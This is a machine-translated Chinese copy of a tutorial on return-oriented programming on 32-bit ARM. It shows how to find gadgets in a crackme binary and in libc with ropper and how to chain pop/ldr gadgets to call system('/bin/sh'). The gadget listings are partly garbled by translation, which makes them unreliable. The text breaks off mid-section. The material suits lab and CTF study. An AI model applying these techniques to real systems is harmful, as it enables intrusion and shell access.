<html>
<head>
<title>ROP Chains on ARM</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">臂上的ROP链</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/rop-chains-on-arm-3f087a95381e?source=collection_archive---------0-----------------------#2021-07-18">https://infosecwriteups.com/rop-chains-on-arm-3f087a95381e?source=collection_archive---------0-----------------------#2021-07-18</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="7bd2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你好，</p><p id="cd61" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是我第一次写关于媒体的文章，而且会很长。我们将了解Arm32中的ROP链。写这个有两个原因。</p><ol class=""><li id="a295" class="kl km iq jp b jq jr ju jv jy kn kc ko kg kp kk kq kr ks kt bi translated">与x86相比，ARM ROP链上的资源更少(当然也有一些令人敬畏的文章，如azerialabs.com)</li><li id="564f" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">我见过有人做rop，但似乎并不理解它，而且他们也不知道如何为rop链找到这样的小工具。例如，如果他们正在使用某篇文章中的某个特定libc版本的小工具，而当他们遇到具有不同libc版本的二进制文件时，他们正在使用的其他人的文章中的小工具可能不存在。因此，在这些情况下，应该知道如何找到某些小工具进行链接。</li></ol><p id="252f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第二个是我写这篇文章的主要原因。这篇文章的关键在于，不管libc版本如何，人们都应该能够找到他们的小工具。我觉得这越来越无聊了，所以介绍够了，让我们开始吧</p><figure class="kz la lb lc gt ld"><div class="bz fp l di"><div class="le lf l"/></div></figure><p id="faa8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">哦…等等，我忘了ROP的介绍部分</p><h1 id="3a0c" class="lg lh iq bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">ROP简介</h1><p id="d027" class="pw-post-body-paragraph jn jo iq jp b jq me js jt ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk ij bi translated">那么基本上什么是rop链？</p><p id="64b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">顾名思义，面向Rop或Return的编程只是将一些指令链接起来以完成特定的动作。那么我们为什么要做rop呢？嗯嗯…</p><p id="1031" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">众所周知，当编译我们的二进制文件时，它有一些保护机制来防止某些攻击，比如缓冲区溢出。这些保护机制包括NX/DEP、堆栈金丝雀等。在这篇文章中，我将只讨论NX。</p><p id="253c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">NX/DEP =不执行..就这样</p><figure class="kz la lb lc gt ld"><div class="bz fp l di"><div class="mj lf l"/></div></figure><p id="70fc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">NX的想法是让我们的栈<strong class="jp ir">不可执行</strong>。当我们进行缓冲区溢出时，我们会溢出堆栈，并将shell代码放入堆栈中，这样我们就可以执行它来获得一个shell或其他东西。但是当栈变得不可执行时会发生什么呢？？正如你可能猜到的，我们的外壳代码不会运行，因此，我们的利用将失败。这就是ROP发挥作用的地方</p><figure class="kz la lb lc gt ld"><div class="bz fp l di"><div class="mk lf l"/></div></figure><p id="458c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以基本上在ROP的帮助下，我们可以链接指令来做一些事情，而不需要使我们的堆栈可执行。所以下一个问题是我们应该链接什么指令，以及在哪里寻找它。</p><h2 id="5887" class="ml lh iq bd li mm mn dn lm mo mp dp lq jy mq mr lu kc ms mt ly kg mu mv mc mw bi translated">寻找小工具</h2><p id="1041" class="pw-post-body-paragraph jn jo iq jp b jq me js jt ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk ij bi translated">那么这些小玩意到底是什么呢？</p><p id="c8c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它们只是帮助我们制作rop链的汇编指令。除了实际的代码之外，在我们的二进制文件中还有很多有用的指令。另一个要寻找的地方是我们的libc二进制文件，如你所知，当我们加载一个特定的二进制文件时，libc库将被动态地加载到内存中。函数和指令与我们的二进制文件链接，如果它是动态链接的(默认情况下)，就压缩二进制文件的大小。由于在不同的操作系统中使用这些库的不同版本，在一个库中看到的相同的小工具在另一个库中将不可用。</p><p id="3af7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们知道，我们还可以在libc库中查找小工具。所以接下来的问题就是如何寻找这些小玩意。</p><p id="d8dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为此，我们将使用一个名为ropper的工具。在<strong class="jp ir">仿真pi </strong>中安装ropper可能不是一个好主意，因为它非常慢，所以最好在主机中安装ropper。使用下面的命令安装ropper。</p><p id="9ddf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="mx"> sudo pip安装ropper </em></p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi my"><img src="../Images/0a35c7b54cb758646cdb96faa3064ec9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*s82VirtYEVR4G-heHF-JjQ.png"/></div></div></figure><p id="4665" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为我已经ropper它说它已经满意了。接下来的事情是使用ropper。ropper非常容易使用。只需输入ropper来运行ropper</p><blockquote class="nf ng nh"><p id="2cb2" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">用户@ Ubuntu:~ $ ropper<br/>(ropper)&gt;</p></blockquote><p id="9acc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们在ropper界面中。所以要使用file命令加载文件</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi nl"><img src="../Images/6698c9f78300a72b8816987f53c6dd81.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FB24k9r8DPgcpMie9uNzTA.png"/></div></div></figure><p id="f3de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我把二进制的crackme加载到ropper中。现在，我们可以使用search命令搜索小工具。</p><p id="a7b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="mx">搜索/ &lt;深度&gt; / &lt;小工具&gt; //这应该是搜索小工具</em>的方式</p><p id="a3f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">例如，如果我想加载二进制文件中的所有小工具，我可以简单地输入"<em class="mx"> gadgets </em>"</p><blockquote class="nf ng nh"><p id="da5b" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">(crackme#1/ELF/ARM)&gt;小工具</p><p id="d6c3" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">小工具<br/> ======</p><p id="9039" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">0x000105b0:add r4,r4,#1;ldr r3,[r5,#4]!；mov r0,r7;MOV R1, R8mov r2, sb;BLX R3 ?<br/>0x0001030c: andoq r0, r0, r6, lsl r5;其中,安卓r0,r2,r0,ror R7;andesq r0, r0, r6, lsl r6;push {r3, lr};bl#0x3c8;pop {r3,pc};<br/>0x00010314: andoq r0, r0, r6, lsl r6;push {r3, lr};bl#0x3c8;pop {r3,pc};0x000105d4: ansq r0, r1, ip, asr #1andesq r0, r1, r4, asr #1bx lr;0x000105d4: ansq r0, r1, ip, asr #1andesq r0, r1, r4, asr #1bx lr;push {r3, lr};pop {r3,pc};0x000105d8: ansq r0, r1, r4, asr #1bx lr;<br/>0x000105d8: ansq r0, r1, r4, asr #1;bx lr;push {r3, lr};pop {r3,pc};<br/>0x00010310: andoq r0, r2, r0, ror r7;andesq r0, r0, r6, lsl r6;push {r3, lr};bl#0x3c8;pop {r3,pc};0x00010430: asrs r1, r1, #1;bxeq lr;ldr r3,[pc,#0x10];cmp r3,#0;bxeq lr;bx r3 ?0x00010494:b #0x41c;ldr r3,[pc,#0x10];cmp r3,#0;beq #0x490;BLX R3 ?0x000104a0:beq #0x490;BLX R3 ?0x0001031c:bl #0x3c8;pop {r3,pc};0x00010468:bl #0x3ecmov r3,#1;strb r3,[r4];pop {r4,pc};<br/>0x000104a4:blx r30x000105cc: bne #0x5b0;pop {r3, r4, r5, r6, r7, r8, sb, pc};andesq r0, r1, ip, asr #1;andesq r0, r1, r4, asr #1bx lr;<br/>0x000105dc: bx lr<br/>0x000105dc: bx lr;push {r3, lr};pop {r3,pc};<br/>0x0001040c:bx r30x00010408: bxeq lr;bx r3 ?0x00010434: bxeq lr;ldr r3,[pc,#0x10];cmp r3,#0;bxeq lr;bx r3 ?0x000103fc: bxls lr;ldr r3,[pc,#0x10];cmp r3,#0;bxeq lr;bx r3 ?0x0001049c:cmp r3,#0;beq #0x490;BLX R3 ?0x00010404:cmp r3,#0;bxeq lr;bx r3 ?0x00010460:cmp r3,#0;popne {r4,pc};bl #0x3ec;mov r3,#1;strb r3,[r4];pop {r4,pc};0x000103f8:cmp r3,#6;bxls lr;ldr r3,[pc,#0x10];cmp r3,#0;bxeq lr;bx r3 ?<br/>0x000105c8:cmp r4,r6bne #0x5b0;pop {r3, r4, r5, r6, r7, r8, sb, pc};andesq r0, r1, ip, asr #1;andesq r0, r1, r4, asr #1bx lr;0x00010498:ldr r3,[pc,#0x10]cmp r3,#0;beq #0x490;BLX R3 ?0x00010400:ldr r3,[pc,#0x10]cmp r3,#0;bxeq lr;bx r3 ?0x000105b4:ldr r3,[r5,#4]!；mov r0,r7;MOV R1, R8mov r2, sb;BLX R3 ?0x000105b8:mov r0,r7MOV R1, R8mov r2, sb;BLX R3 ?<br/>0x000105bc:mov r1,r8mov r2, sb;BLX R3 ?<br/>0x000105c0: mov r2, sb;BLX R3 ?<br/>0x0001046c:mov r3,#1;strb r3,[r4];pop {r4,pc};0x00010490: pop {r3, lr};b#0x41c;ldr r3,[pc,#0x10];cmp r3,#0;beq #0x490;BLX R3 ?0x00010320: pop {r3, pc};0x000105d0: pop {r3, r4, r5, r6, r7, r8, sb, pc};andesq r0, r1, ip, asr #1;andesq r0, r1, r4, asr #1bx lr;0x000105d0: pop {r3, r4, r5, r6, r7, r8, sb, pc};andesq r0, r1, ip, asr #1;andesq r0, r1, r4, asr #1bx lr;push {r3, lr};pop {r3,pc};0x00010474: pop {r4, pc};0x00010464: popne {r4, pc};bl #0x3ec;mov r3,#1;strb r3,[r4];pop {r4,pc};0x00010318: push {r3, lr};bl#0x3c8;pop {r3,pc};0x000105e0: push {r3, lr};pop {r3,pc};0x00010470: strb r3, [r4]pop {r4,pc};</p><p id="dd39" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">发现42个小工具<br/> (crackme#1/ELF/ARM) &gt;</p></blockquote><p id="aaab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如你所见，它打印出了二进制文件中的所有小工具。现在搜索，如上所述你可以使用"<em class="mx">搜索/ &lt;深度&gt; / &lt;小工具&gt; </em>"</p><blockquote class="nf ng nh"><p id="f186" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">(crack me # 1/ELF/ARM)&gt; search/1/pop<br/>[INFO]搜索小工具:pop</p><p id="29f2" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">【信息】文件:crackme#1 <br/> 0x00010320: pop {r3，PC }；<br/> 0x00010474: pop {r4，PC }；</p><p id="361d" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">(crackme#1/ELF/ARM)&gt;搜索pop <br/> [INFO]搜索小工具:pop</p><p id="bd63" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">[INFO]File:crack me # 1<br/>0x 00010490:pop { R3，lr }；b # 0x41cldr r3，[pc，# 0x 10]；cmp r3，# 0；beq # 0x490blx r3<br/> 0x00010320: pop {r3，PC }；<br/> 0x000105d0: pop {r3，r4，r5，r6，r7，r8，sb，PC }；andeq r0，r1，ip，ASR # 1；和q r0，r1，r4，ASR # 1；bx lr<br/> 0x000105d0: pop {r3，r4，r5，r6，r7，r8，sb，PC }；andeq r0，r1，ip，ASR # 1；和q r0，r1，r4，ASR # 1；bx lr推{r3，lr }；pop {r3，PC }；<br/> 0x00010474: pop {r4，PC }；<br/> 0x00010464: popne {r4，PC }；bl # 0x3ecmov r3，# 1；strb r3，[R4]；pop {r4，PC }；</p><p id="044e" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">(crackme#1/ELF/ARM)&gt;</p></blockquote><p id="1698" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在看看用法，我将深度指定为1，将小工具指定为pop，因此它显示的指令有pop。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi nm"><img src="../Images/e600b4a68a2c4d76365c5192241f4dca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0KuGGxc0FfQVA0snFXOGjA.png"/></div></div></figure><p id="f8d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看看第一名和第二名之间的输出差异。在第一种情况下，我指定了深度，所以它只显示具有pop的指令，但是在第二种情况下，我没有指定任何深度，所以它显示具有其他具有pop指令的元素。记住这一点，让我们进入下一阶段</p><h2 id="cdad" class="ml lh iq bd li mm mn dn lm mo mp dp lq jy mq mr lu kc ms mt ly kg mu mv mc mw bi translated">要找什么小工具</h2><p id="42d5" class="pw-post-body-paragraph jn jo iq jp b jq me js jt ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk ij bi translated">有很多小工具，所以我们应该减少小工具，选择对我们有用的。哦，等等，这里的目的是什么？？？</p><figure class="kz la lb lc gt ld"><div class="bz fp l di"><div class="nn lf l"/></div></figure><p id="624d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">别忘了我们链接这些小工具是为了做一些事情。那么我们的目标是什么？正如我所说的，我们可以用我们想要的方式把它们连接起来，然后完成一些事情。</p><p id="f33e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在缓冲区溢出中，我们主要执行外壳代码，以便获得反向连接或外壳来提升权限。所以想一想，如果我们把这些小工具或者指令以一种给我们外壳的方式连接起来会怎么样？听起来很有趣，对吗？这正是我们要做的。</p><figure class="kz la lb lc gt ld"><div class="bz fp l di"><div class="no lf l"/></div></figure><p id="4ac4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那么什么函数会对此有帮助呢？？任何想法… <strong class="jp ir">请看“系统功能”。</strong>系统函数是通过调用<strong class="jp ir"> /bin/sh来执行命令的函数。</strong>我们现在可以查看系统功能的手册页。</p><p id="45fb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="mx">欲了解更多关于系统、功能的信息</em>点击<a class="ae np" href="https://linux.die.net/man/3/system" rel="noopener ugc nofollow" target="_blank">此处</a></p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi nq"><img src="../Images/de3d91920847baff344e8652d3993fc9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WdITsE3Vp-5bRX8hguhAZg.png"/></div></div></figure><p id="89d6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我不想在这里解释不必要的东西，所以长话短说，系统函数将其参数作为命令，执行它，并返回输出，所以我们可以尝试使用下面的简单c代码。</p><blockquote class="nf ng nh"><p id="21b2" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">#包括<stdlib.h/></p><p id="6f21" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">int main(){</p><p id="3223" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">系统(“ls”)；</p><p id="9562" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi">}</p></blockquote><p id="e24e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这将执行“ls”命令</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi nr"><img src="../Images/18fb4690dbcb92e524d805a349025153.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*g1XVwX5y0wAJRpQW7dhZIA.png"/></div></div></figure><p id="d791" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，您可以在这里执行命令并列出文件。那么如果我们把<strong class="jp ir"> /bin/sh </strong>作为参数传递会发生什么…让我们看看</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi ns"><img src="../Images/68d08d9de85aa90114e171d641e3d9d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hpKizCeckAASB7sMq4RjTw.png"/></div></div></figure><p id="c72a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不出所料，我们得到了一个弹壳</p><p id="c960" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以结论是我们可以调用系统函数，并通过传递“/bin/sh”作为参数来获得一个shell。现在让我们继续手臂的事情</p><h2 id="12ef" class="ml lh iq bd li mm mn dn lm mo mp dp lq jy mq mr lu kc ms mt ly kg mu mv mc mw bi translated"><strong class="ak">调用ARM中的系统函数</strong></h2><p id="966e" class="pw-post-body-paragraph jn jo iq jp b jq me js jt ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk ij bi translated">在ARM中，函数的参数通过寄存器和堆栈传递。前四个参数通过<strong class="jp ir"> r0传递到r3 </strong>，后面的参数通过<strong class="jp ir">堆栈</strong></p><p id="caeb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我们的例子中，系统函数将一个参数作为要执行的命令。因此，要获得一个shell，我们需要将字符串“/bin/sh”作为第一个参数传递到寄存器r0中，之后，我们应该调用系统函数。现在我们都准备好用ropper寻找小工具了。</p><h2 id="25ec" class="ml lh iq bd li mm mn dn lm mo mp dp lq jy mq mr lu kc ms mt ly kg mu mv mc mw bi translated">寻找合适的小工具</h2><p id="f2b5" class="pw-post-body-paragraph jn jo iq jp b jq me js jt ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk ij bi translated">这是本文最相关的部分，我希望您能够找到自己的小工具，而不用考虑libc版本。</p><p id="1e4b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，如你所知，我们需要调用系统函数，将“/bin/sh”字符串作为r0寄存器中的参数(第一个参数)。我们唯一能控制的是堆栈，我们不能直接把数据放入r0寄存器。因此，我们的目标是找到一个小工具，将堆栈中特定位置的数据放入r0寄存器，我们还需要重新获得对pc的控制，以便我们可以调用系统函数来获取shell…有什么想法吗？？？？</p><figure class="kz la lb lc gt ld"><div class="bz fp l di"><div class="nt lf l"/></div></figure><p id="8631" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有两个常见的arm指令可以帮助您实现这一点。他们是</p><ol class=""><li id="9997" class="kl km iq jp b jq jr ju jv jy kn kc ko kg kp kk kq kr ks kt bi translated">弹出指令</li><li id="4897" class="kl km iq jp b jq ku ju kv jy kw kc kx kg ky kk kq kr ks kt bi translated">加载指令</li></ol><p id="69e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">弹出指令将数据从堆栈弹出到寄存器。所以我们可以把堆栈中的值弹出到r0寄存器中，对吗？。类似地，如果你看一下load指令，它可以将值从堆栈加载到寄存器。因此，我们可以使用ropper来查找将值从堆栈放入r0寄存器的pop / load指令，并寻找将控制权交还给我们的小工具，以便我们可以调用系统函数(像pop {pc}这样的小工具)。我们将在我们的图书馆中寻找这些小工具。我用的是azeria实验室的ubuntu 16.04，它模仿了raspi。arm版本是Arm 6I ( <a class="ae np" href="https://azeria-labs.com/arm-lab-vm/" rel="noopener ugc nofollow" target="_blank"> link </a>)。</p><p id="34cb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">顺便说一下，你也可以使用其他pop，比如弹出r3或r4等，并使用mov小工具将该值复制到r0，但我想让rop链更加简单和干净。如果你有简单的小工具，你应该总是考虑使用它。例如，如果您有一个直接弹出到r0 (pop {r3，r0})的小工具和另一个弹出到r4和r5的小工具。毫无疑问，你应该使用第一个，为什么？？因为更简单干净。如果您使用第二个(pop {r4，r5})，您还需要找到另一个mov小工具来将数据从r4或r5复制到r0，如果您在一个小工具中得到您想要的东西，为什么还要麻烦地链接两个小工具呢？我是说为什么？？？</p><figure class="kz la lb lc gt ld"><div class="bz fp l di"><div class="mj lf l"/></div></figure><p id="a691" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，您需要将libc库从模拟pi复制到主机。如果在仿真pi中使用ropper，将会花费很多时间。</p><p id="e48d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你想看到库被加载。您可以将二进制文件加载到gdb中，并在您喜欢的任何地方放置一个断点，一旦命中，使用“vmmap”命令查看二进制文件的映射对象。所以位置是'/lib/arm-Linux-gnueabihf/libc-2.19 . so '。</p><p id="b9a0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，这只有在二进制文件被动态链接时才能看到。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi nu"><img src="../Images/0ef33c6360fd7e869e17ff9c612258f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MHXq3HT84VF9zI6slPCl-Q.png"/></div></div></figure><p id="d341" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以你可以从/lib/arm-Linux-gnueabihf/libc-2.19 . so中复制这个库。我刚刚用bashupload.com上传了这个，然后用curl把它下载回主机。</p><p id="492f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，使用file命令将libc加载到ropper中</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/9d30dcaffb153d888bea2918274725b0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1094/format:webp/1*4u_DXyhIal2vmpkNmSV5Yg.png"/></div></figure><p id="c8e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们需要找到将数据从堆栈弹出到r0寄存器的小工具，这样我们就可以搜索它了</p><blockquote class="nf ng nh"><p id="7377" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">搜索/1/弹出</p></blockquote><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi nw"><img src="../Images/8edb780fc0ef03db6df2651d95858fb8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mwxw7jPYA4UyQpxw2CskOg.png"/></div></div></figure><p id="954e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">幸运的是，我们有两个小工具可以从堆栈中弹出数据到r0寄存器。如果你看第一个，它比第二个有更多的弹出数据，并以bx ip结束。所以考虑第二个会更好为什么？我们不想处理许多复杂的分支，如bx ip，我们也没有得到控制，它以“bx ip”结束。我们应该总是考虑简洁和简单的小工具。如果我们看第二个，它并不复杂，没有任何其他指令。它从堆栈中弹出三个值到r0，r4，pc，所以我们有机会把我们的输入数据放入r0(第一个参数) 它还将第三个值弹出到pc，这将帮助我们将控制返回到用户输入。如果您设法在第三次弹出时将系统函数的地址放入pc，则利用就完成了，我们将获得外壳，就这么简单。 所以最好选择第二个弹出指令(用红色标记突出显示)。</p><p id="2aa4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这一个小工具就足以利用这个漏洞。但是我们不会就此罢休的..(我猜这不是畏缩)。</p><p id="9a3e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我所说，这篇文章的关键是帮助你找到你的小工具，所以让我们继续下一个小工具<em class="mx">加载</em>。我们现在将搜索“ldr”。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi nx"><img src="../Images/f0c7739a7a1e9a407ce60e7fcd72ef03.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dRunNr3_T6Uvq0S2aiiT0g.png"/></div></div></figure><p id="f019" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们需要从这个输出中挑选出有用的小工具，所以我们需要一些小工具将数据从数据("/bin/sh ")加载到r0寄存器</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi nx"><img src="../Images/b59d3726d829b46a9d04637e61addf72.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LLZGNDi3X5SB7hq0MK43BQ.png"/></div></div></figure><p id="7124" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如您在这里看到的，它将堆栈[sp，#0x18]中的数据载入r0寄存器，然后是一些pop。在最后一次pop中，我们得到了控制权，同样，如果您将“/bin/sh”字符串的地址放入r0，并在最后一次pop中调用系统函数(pop {r3，r4，r5，r6，r7，pc})，我们将得到一个shell。</p><p id="c0dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果是比较少的小工具，你可以搜索没有深度的小工具，挑出有用的。因此，让我们使用“搜索ldr”来完成</p><p id="dbc2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp 